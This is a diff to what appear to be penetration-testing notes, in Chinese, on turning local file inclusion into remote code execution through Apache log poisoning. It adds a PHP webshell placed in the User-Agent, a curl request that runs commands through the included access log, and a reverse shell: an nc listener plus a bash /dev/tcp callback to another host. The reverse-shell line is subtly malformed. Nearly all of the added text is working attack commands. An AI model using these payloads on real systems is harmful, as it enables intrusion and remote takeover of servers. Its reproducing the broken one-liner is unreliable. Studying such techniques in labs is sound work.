@@ -173,5 +173,15 @@ LFI to RCE
 
     變更user-agent
     <?php system($_GET[1])?>
+    curl 'http://192.168.0.10/inc.php?f=/var/log/apache2/access.log&1=id'
 ![image](https://github.com/user-attachments/assets/adfbbf8e-39f5-4a64-9de4-791084eaffe3)
 ![image](https://github.com/user-attachments/assets/a75a0457-b4ef-4508-88ec-be8720d28772)
+![image](https://github.com/user-attachments/assets/28595885-9dda-4a9e-a633-bc8f915d024f)
+
+    反向shell
+    nc -lvnp 1234
+    curl -G 'http://192.168.0.14/inc.php' --data f=/var/log/apache2/access.log --data-urlencode "1=bash -c 'bash -i /dev/tcp/192.168.0.18/1234 0&<1 2>&1'"
+![image](https://github.com/user-attachments/assets/13bc7ba4-4cd2-4610-bedd-4fd8be24ae8c)
+![image](https://github.com/user-attachments/assets/09adbbb8-f97d-495f-b82f-4b71be0a551f)
+
+    
